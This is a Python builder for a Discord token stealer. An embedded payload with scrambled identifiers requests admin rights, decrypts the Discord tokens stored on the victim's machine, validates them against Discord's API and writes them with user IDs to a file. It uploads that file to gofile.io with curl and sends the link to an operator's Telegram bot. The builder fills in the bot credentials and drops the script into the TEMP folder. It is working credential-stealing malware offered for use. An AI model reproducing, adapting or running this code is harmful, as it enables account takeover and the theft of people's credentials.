import os

code = """
import base64
import binascii
from Crypto.Cipher import AES
import win32crypt
import os
import json
import requests
import subprocess
import sys
import ctypes

ARPZAP = ''
QQQEElP = ''


def IPXRXX(IXRElQEP):
    url = f'https://api.telegram.org/bot{ARPZAP}/SendMessage?chat_id={QQQEElP}&text=Target: {XRAlXXOE}\\nDownload Link: {IXRElQEP}'

    requests.get(url)


def PPXAl(file):

    os.chdir('C:/Users/' + XRAlXXOE)
    res = subprocess.check_output('curl -s https://api.gofile.io/servers', shell=True).decode()
    data = json.loads(res)
    ZQPOPl = data['data']
    ZQPOPl = ZQPOPl['servers'][0].get('name')
    res = subprocess.check_output(f'curl -s -F file=@{file} https://{ZQPOPl}.gofile.io/contents/uploadfile', shell=True).decode()
    data = json.loads(res)
    IXRElQEP = data['data']['downloadPage']
    IPXRXX(IXRElQEP)


def lQXRlOA(OOREOP):
    r = requests.get(url='https://discord.com/api/v9/users/@me/settings', headers={'Authorization': f'{OOREOP}'})
    if r.status_code == 200:
        try:
            return r.status_code, json.loads(r.text)['custom_status']['text']
        except:
            return r.status_code, 'Status'
    else:
        return r.status_code, 'ERROR'


def lIlIlRO():
    return os.getlogin()


def IIlRIAIQ():
    path = 'c:/Users/' + XRAlXXOE + '/AppData/Roaming/discord/Local State'
    with open(path, 'r') as f:
        data = f.read()
        data = json.loads(data)
        key = data['os_crypt'][
            'encrypted_key']
        ERAEEZXX = base64.b64decode(key)[5:]
        return win32crypt.CryptUnprotectData(ERAEEZXX, None, None, None, 0)[
            1]


class Discord:
    QPOXRIO = []
    XlRAQPQO = []

    def __init__(self):
        pass

    def lREOPQZ(self):

        path: str = "c:/Users/" + XRAlXXOE + "/AppData/Roaming/discord/Local Storage/leveldb/"
        IElQOXAI = IIlRIAIQ()
        for file in os.listdir(path):
            if file[-3:] in ['ldb', 'log']:
                with open(path + file, errors='ignore') as f:
                    data = f.readlines()
                    OIXPPRA = [x.strip().split('dQw4w9WgXcQ:')[1] for x in data if 'dQw4w9WgXcQ:' in x]
                    for XQQOIXX in OIXPPRA:
                        XQQOIXX = XQQOIXX.split()[0].split('"')[0]
                        self.QPOXRIO.append(XQQOIXX)

        for XQQOIXX in self.QPOXRIO:
            PPPlPIQE = base64.b64decode(XQQOIXX)
            iv = PPPlPIQE[3:15]
            EAlIREPX = PPPlPIQE[15:]
            XIIZAXQO = AES.new(IElQOXAI, AES.MODE_GCM, iv)
            PIlER = XIIZAXQO.decrypt(EAlIREPX)
            try:
                self.XlRAQPQO.append(PIlER[:-15].decode('utf-8'))
            except UnicodeDecodeError:
                try:

                    self.XlRAQPQO.append(PIlER[:-16].decode('utf-8'))
                except UnicodeDecodeError:
                    continue
        return self.XlRAQPQO


def OAQlOZ():

    try:
        AXEIXA = ctypes.windll.shell32.IsUserAnAdmin()
    except:
        AXEIXA = False
    if not AXEIXA:
        ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, '"' + __file__ + '"', None, 1)
        sys.exit()

def  main():
    discord = Discord()
    XlRAQPQO = discord.lREOPQZ()
    QOlEERX = ['', '`', '', '|', '', '', "'", '%', '"', '!', ']', '[', '(', ')', '']
    for OOREOP in XlRAQPQO:
        for char in QOlEERX:
            if char in OOREOP:
                OOREOP = OOREOP.replace(char, '')
        IlRIlR = lQXRlOA(OOREOP)
        IRQXPZ = OOREOP.split('.')
        uid = IRQXPZ[0]
        if uid.startswith('NT'):
            IXPAO = base64.b64decode(uid).decode('utf-8')
        elif uid.startswith('MT'):
            uid = uid + '.' + IRQXPZ[1][:2]
            IXPAO = base64.b64decode(uid)[:-2].decode('utf-8')
        elif uid.startswith('OD') or uid.startswith('O'):
            uid = uid + '.' + IRQXPZ[1][:4]
            IXPAO = base64.b64decode(uid)[:-3].decode('utf-8')
        else:
            try:
                IXPAO = base64.b64decode(uid).decode('utf-8')
            except binascii.Error:
                uid = ''.join(IRQXPZ)[:28]
                IXPAO = base64.b64decode(uid)[:-2].decode('utf-8')

        os.chdir(f'C:/Users/{lIlIlRO()}')
        with open('helloworld.txt', 'a', encoding='utf-8', errors='ignore') as f:
            f.writelines(
                ['=' * 65, f'''
Code: {IlRIlR[0]}
Key: {OOREOP}
Discord ID: {IXPAO}
Name: {IlRIlR[1]}
''', '=' * 65, '\\n'])
    PPXAl('helloworld.txt')
    os.remove('helloworld.txt')


if __name__ == '__main__':
    OAQlOZ()
    XRAlXXOE = lIlIlRO()
    main()
"""

def code_writer(tbot, chn):
    temp_path = os.path.join(os.environ['TEMP'], 'd_t.py')
    modified_code = code.replace("ARPZAP = ''", f"ARPZAP = '{tbot}'")
    modified_code = modified_code.replace("QQQEElP = ''", f"QQQEElP = {chn}")
    try:
        with open(temp_path, 'w', encoding='utf-8') as f:
            f.write(modified_code)
        return temp_path
    except:
        return False
        